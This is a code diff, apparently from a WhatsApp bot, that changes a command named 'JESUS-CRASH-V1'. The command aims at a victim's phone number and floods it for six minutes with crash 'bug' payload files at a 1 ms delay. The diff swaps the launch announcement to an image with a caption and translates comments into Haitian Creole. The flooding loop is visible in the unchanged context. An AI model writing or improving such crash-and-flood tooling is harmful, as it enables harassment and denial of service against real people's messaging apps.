@@ -45,11 +45,16 @@ cmd({
       }, { quoted: mek });
     }
 
+    // ✅ Voye imaj `2.png` ak caption
+    const imagePath = path.join(__dirname, '../media/2.png');
+    const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
-      text: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐂𝐑𝐀𝐒𝐇-𝐕𝟏 launched on wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
+      image: imageBuffer,
+      caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐂𝐑𝐀𝐒𝐇-𝐕𝟏 launched on wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
-    const endTime = Date.now() + (6 * 60 * 1000); // 6 minutes
+    // Atak la kòmanse
+    const endTime = Date.now() + (6 * 60 * 1000); // 6 minit
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -79,7 +84,7 @@ cmd({
           console.error(`❌ Error in ${file}:`, e.message);
         }
 
-        await new Promise(res => setTimeout(res, 1)); // 1ms delay
+        await new Promise(res => setTimeout(res, 1)); // Delay 1ms
       }
     }
 
